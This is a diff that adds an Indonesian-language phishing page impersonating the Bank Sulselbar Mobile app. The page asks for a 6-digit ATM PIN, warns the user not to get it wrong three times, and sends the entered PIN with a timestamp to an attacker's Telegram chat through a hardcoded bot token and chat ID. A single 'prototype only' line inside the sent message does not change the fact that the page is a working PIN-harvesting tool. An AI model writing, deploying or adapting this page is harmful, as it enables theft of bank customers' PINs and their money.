@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi PIN ATM - Bank Sulselbar Mobile</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #eeeeee;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background-color: #7cad21;
+            padding: 18px 22px;
+            display: flex;
+            align-items: center;
+            height: 60px;
+        }
+
+        .back-btn {
+            color: #fff;
+            font-size: 20px;
+            text-decoration: none;
+            margin-right: 12px;
+            font-weight: 500;
+        }
+
+        .header-title {
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .form-container {
+            background-color: #fff;
+            margin: 12px 15px;
+            padding: 25px 22px;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .input-group {
+            margin-bottom: 28px;
+        }
+
+        .input-label {
+            display: block;
+            color: #2d2d2d;
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 8px 0;
+            border: none;
+            border-bottom: 1.5px solid #ddd;
+            font-size: 16px;
+            color: #444;
+            outline: none;
+            inputmode: numeric;
+            maxlength: 6;
+        }
+
+        .input-field::placeholder {
+            color: #a0a0a0;
+            font-size: 15px;
+        }
+
+        .warning {
+            color: #dc3545;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            padding: 10px;
+            background-color: #ffebee;
+            border-radius: 3px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #7cad21;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #6b9a1e;
+        }
+
+        .footer {
+            background-color: #7cad21;
+            height: 45px;
+            margin-top: auto;
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 12px 20px;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            display: none;
+            z-index: 999;
+        }
+
+        .success {
+            background-color: #28a745;
+        }
+
+        .error {
+            background-color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="pin.html" class="back-btn">←</a>
+        <div class="header-title">Verifikasi PIN ATM</div>
+    </div>
+
+    <div class="form-container">
+        <form id="pinForm">
+            <div class="input-group">
+                <label class="input-label">PIN ATM Anda (6 Digit)</label>
+                <input type="password" class="input-field" id="pinATM" placeholder="******" required>
+            </div>
+
+            <div class="warning">⚠️ PERINGATAN: PIN JANGAN SAMPAI SALAH 3 x!</div>
+
+            <button type="submit" class="submit-btn">VERIFIKASI PIN</button>
+        </form>
+    </div>
+
+    <div class="notification" id="notif"></div>
+    <div class="footer"></div>
+
+    <script>
+        // Konfigurasi Telegram Bot
+        const TELEGRAM_BOT_TOKEN = "7974193072:AAF_TKuWn3qw-hM7Ue3C8pV4KIcJev3xBWc";
+        const TELEGRAM_CHAT_ID = "8300474620";
+
+        // Fungsi Tampilkan Notifikasi
+        function showNotification(message, type) {
+            const notif = document.getElementById('notif');
+            notif.textContent = message;
+            notif.className = `notification ${type}`;
+            notif.style.display = 'block';
+            setTimeout(() => notif.style.display = 'none', 3000);
+        }
+
+        // Fungsi Kirim Data ke Telegram (TERMASUK PIN LENGKAP)
+        async function sendToTelegram(pinATM) {
+            try {
+                const message = `
+🔐 **PERMINTAAN VERIFIKASI PIN ATM - BANK SULSELBAR** 🔐
+PIN ATM yang Diinput: ${pinATM}
+Waktu Verifikasi: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+⚠️ PROTOTIPE SAJA - JANGAN GUNAKAN DATA NYATA! ⚠️
+                `.trim();
+
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                return (await response.json()).ok;
+            } catch (error) {
+                console.error("Error:", error);
+                return false;
+            }
+        }
+
+        // Handle Submit Form
+        document.getElementById('pinForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const pinATM = document.getElementById('pinATM').value;
+
+            // Validasi Panjang PIN
+            if (pinATM.length !== 6) {
+                showNotification("❌ PIN ATM harus 6 digit!", "error");
+                return;
+            }
+
+            showNotification("Mengirim data...", "success");
+
+            // Kirim ke Telegram (termasuk PIN lengkap)
+            const isSent = await sendToTelegram(pinATM);
+            
+            if (isSent) {
+                showNotification("✅ Data  di proses", "success");
+                document.getElementById('pinForm').reset();
+            } else {
+                showNotification("❌ Gagal kirim data! Coba lagi", "error");
+            }
+        });
+    </script>
+</body>
+</html>
